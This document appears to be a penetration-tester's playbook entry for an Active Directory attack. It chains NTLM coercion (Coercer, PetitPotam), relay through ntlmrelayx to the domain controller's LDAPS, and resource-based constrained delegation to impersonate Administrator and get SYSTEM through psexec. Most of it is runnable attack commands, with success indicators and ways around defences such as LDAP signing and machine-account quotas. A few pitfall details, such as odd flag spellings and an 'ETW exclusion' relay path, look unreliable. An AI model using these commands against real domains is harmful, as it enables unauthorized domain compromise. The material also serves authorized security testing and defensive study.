# NTLM Relay to RBCD (Coercer + ntlmrelayx)

## When this applies

- Target machine can reach your IP on port 445 and you can relay to DC LDAPS.
- You have any authenticated foothold to trigger NTLM coercion (PetitPotam, PrinterBug, EFS, etc.).
- Goal: relay coerced machine-account NTLM auth to DC LDAPS, create a controlled machine account, and set RBCD on the coerced machine in one flow.

## Technique

Combines NTLM coercion + relay + RBCD configuration. The coerced target authenticates to your relay; ntlmrelayx forwards the auth to DC LDAPS, creates a fresh machine account, and writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the coerced machine — all in a single flow.

## Steps

```bash
# When target machine can reach your IP on port 445 and you can relay to DC LDAPS:
# Combines NTLM coercion + relay + RBCD in one flow

# Step 1: Start ntlmrelayx targeting DC LDAPS with --delegate-access
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --remove-mic
# Creates a new machine account (e.g., RANDOM$) and sets RBCD on the coerced machine

# Step 2: Trigger NTLM auth from target to your IP (port 445)
# Coercer tries all known RPC coercion methods (PrinterBug, PetitPotam, EFS, etc.)
python3 Coercer.py coerce -l YOUR_IP -t TARGET_IP -u user -p pass -d domain --always-continue
# Or specific: python3 PetitPotam.py YOUR_IP TARGET_IP domain/user:pass

# Step 3: ntlmrelayx catches TARGET$ auth, relays to DC LDAPS, creates RBCD
# Watch for: "Adding new computer with username: RANDOM$ and password: ..."
#            "Delegation rights modified successfully!"
#            "RANDOM$ can now impersonate users on TARGET$ via S4U2Proxy"

# Step 4: S4U2Proxy with the created machine account
getST.py -spn 'cifs/TARGET.domain.com' -impersonate Administrator \
  -dc-ip DC_IP 'domain/RANDOM$:relay_generated_password'
```

## Verifying success

- ntlmrelayx logs `Delegation rights modified successfully!` and prints the generated machine account name + password.
- `getST.py` produces a TGS for the target SPN as Administrator.
- `psexec.py -k -no-pass <target>` lands SYSTEM.

## Common pitfalls

- LDAP signing required by DC: relay to LDAPS (TCP 636) instead of LDAP (TCP 389). `--remove-mic` is needed for some patched versions.
- `MachineAccountQuota = 0` blocks step 1's machine-account creation. Use `-delegate-access -no-add-computer` and target an existing controlled computer object.
- For DC2019+ with LDAP signing+channel-binding mandatory, you may need to coerce a machine account that supports cross-protocol relay (HTTP→LDAPS, SMB→LDAPS via ETW exclusion).

## Tools

- impacket `ntlmrelayx.py`, `getST.py`, `psexec.py`
- Coercer
- PetitPotam
